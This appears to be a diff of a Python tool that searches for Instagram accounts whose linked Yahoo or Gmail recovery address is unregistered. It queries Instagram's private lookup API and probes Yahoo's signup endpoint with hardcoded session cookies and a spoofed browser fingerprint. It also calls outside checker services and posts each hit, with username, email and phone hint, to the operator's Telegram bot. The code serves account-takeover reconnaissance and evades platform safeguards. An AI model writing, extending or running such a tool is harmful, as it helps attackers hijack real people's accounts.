@@ -1,6 +1,7 @@
 import requests,os,random,time
 import webbrowser
 from time import sleep
+from user_agent import generate_user_agent
 user_agent = [
     "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",'Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
     'Instagram 64.0.0.12.96 (iPhone8,1; iOS 12_0_1; pt_BR; pt-BR; scale=2.00; gamut=normal; 750x1334; 124976489)',
@@ -12,7 +13,7 @@ if X == 1 :
 	try:
 		tok=input("[?] TOKEN : ")
 		ic=input("[?] ID : ")
-		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=HI\nIf you have a problem tell me\nINSTA : @DOOM.OLD| TELE : @ZXXXXZV")
+		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=HI\nIf you have a problem tell me\nINSTA : @MTJR_DOOM | TELE : @ZXXXXZV")
 	except:
 		print("[!] Try with VPN ")
 		input("")
@@ -20,8 +21,9 @@ if X == 1 :
 else:
 	pass
 os.system('cls' if os.name == 'nt' else 'clear')#DOOM
-print("""\033[0;97mINSTA : DOOM.OLD – 968.OPS\n\033[1;34mIf you get a problem tell me in Instagram\nin » my instagram\nte » my telegram""")
+print("""\033[0;97mINSTA : MTJR_DOOM – 968.OPS\n\033[1;34mIf you get a problem tell me in Instagram\nin » my instagram\nte » my telegram""")
 def ops1(user):
+	x=random.choice(user_agent)
 	try:
 		user=user.split("/")[3]
 		user=user.split("?")[0] or user.split("/")[0]
@@ -31,11 +33,10 @@ def ops1(user):
 	print(f"\033[1;30m[\033[0;37m?\033[1;30m] username: {user}\033[0;37m")
 	url = "https://i.instagram.com:443/api/v1/users/lookup/"
 	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
-	x=random.choice(user_agent)
 	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
            "Accept-Language": "ar-AE",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-           "User-Agent": x,
+           "User-Agent":x,
            "Accept-Encoding": "gzip, deflate"}
 	data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
 	try:
@@ -81,21 +82,49 @@ def ops1(user):
 		if m1 == m3 and m2 == m4:
 			v=0
 			if '@yahoo.com' in info["obfuscated_email"]:
-				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
-				if '"status": "Available"}' in req:
-					pass
+				url = 'https://login.yahoo.com/account/module/create?validateField=yid'
+				headers = {
+    'Accept': '*/*',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive',
+    'Content-Length': '17973',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
+    'Host': 'login.yahoo.com',
+    'Origin': 'https://login.yahoo.com',
+    'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
+    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
+    'sec-ch-ua-mobile': '?0',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': str(generate_user_agent()),
+    'X-Requested-With': 'XMLHttpRequest'}
+				data = {
+    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
+    'specId': 'yidreg',
+    'crumb': 'rak/FdAmWa5',
+    'acrumb': '9z9sgq95',
+    'done': 'https://www.yahoo.com',
+    'attrSetIndex': '0',
+    'tos0': 'oath_freereg|xa|ar-JO',
+    'yid': user,
+    'password': 'doomdoom',
+    'shortCountryCode': 'AF',}
+				req = requests.get(url,headers=headers,data=data).text
+				if '"yid"' in req:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
+						eml=user+"@yahoo.com"
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
+					v=1
 				else:
 					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
 					v=1
-				rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
-				if "Linked Or Ban" in rm:
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
-					eml=user+"@yahoo.com"
-				else:
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
-					v=1
-				
 			elif '@gmail.com' in info["obfuscated_email"]:
 				gmail = requests.get("https://soud.me/api/Gmail?email="+user+"@gmail.com").text
 				if '{"info":{"Status":"Available"' in gmail:
@@ -150,17 +179,17 @@ def ops1(user):
 		if v==1:
 			pass
 		else:
-			tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
+			tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : MTJR_DOOM | TELE : @ZXXXXZV")
 	else:
 		pass
 	print('\n'+'\033[1;30m='*20+'\n')
 def net():
-	lis=input("[?] name list : ")
-	for accs in open(lis).read().splitlines():
+	for accs in open('list.txt').read().splitlines():
 		user=str(accs).split('\n')[0]
 		ops1(user)
 		time.sleep(3)
 def ops ():
+	x=random.choice(user_agent)
 	print('\n'+'\033[1;30m='*20+'\n')
 	user=input("\033[1;30m[\033[0;37m?\033[1;30m] username or url user : \033[0;37m")
 	if user == "in":
@@ -176,7 +205,6 @@ def ops ():
 		pass
 	url = "https://i.instagram.com:443/api/v1/users/lookup/"
 	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
-	x=random.choice(user_agent)
 	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
            "Accept-Language": "ar-AE",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -227,19 +255,49 @@ def ops ():
 			v=0
 			vx=0
 			if '@yahoo.com' in info["obfuscated_email"]:
-				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
-				if '"status": "Available"}' in req:
-					pass
+				url = 'https://login.yahoo.com/account/module/create?validateField=yid'
+				headers = {
+    'Accept': '*/*',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive',
+    'Content-Length': '17973',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
+    'Host': 'login.yahoo.com',
+    'Origin': 'https://login.yahoo.com',
+    'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
+    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
+    'sec-ch-ua-mobile': '?0',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': str(generate_user_agent()),
+    'X-Requested-With': 'XMLHttpRequest'}
+				data = {
+    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
+    'specId': 'yidreg',
+    'crumb': 'rak/FdAmWa5',
+    'acrumb': '9z9sgq95',
+    'done': 'https://www.yahoo.com',
+    'attrSetIndex': '0',
+    'tos0': 'oath_freereg|xa|ar-JO',
+    'yid': user,
+    'password': 'doomdoom',
+    'shortCountryCode': 'AF',}
+				req = requests.get(url,headers=headers,data=data).text
+				if '"yid"' in req:
+					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
+					if "Linked Or Ban" in rm:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
+						eml=user+"@yahoo.com"
+					else:
+						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
+					v=1
 				else:
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
-				rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
-				if "Linked Or Ban" in rm:
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
-					eml=user+"@yahoo.com"
-				else:
-					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
-				
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
+					v=1
 			elif '@gmail.com' in info["obfuscated_email"]:
 				gmail = requests.get("https://soud.me/api/Gmail?email="+user+"@gmail.com").text
 				if '{"info":{"Status":"Available"' in gmail:
@@ -286,7 +344,7 @@ def ops ():
 	except:
 		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
 	if X == 1:
-		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
+		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : MTJR_DOOM | TELE : @ZXXXXZV")
 	else:
 		pass
 	print('\n'+'\033[1;30m='*20+'\n')
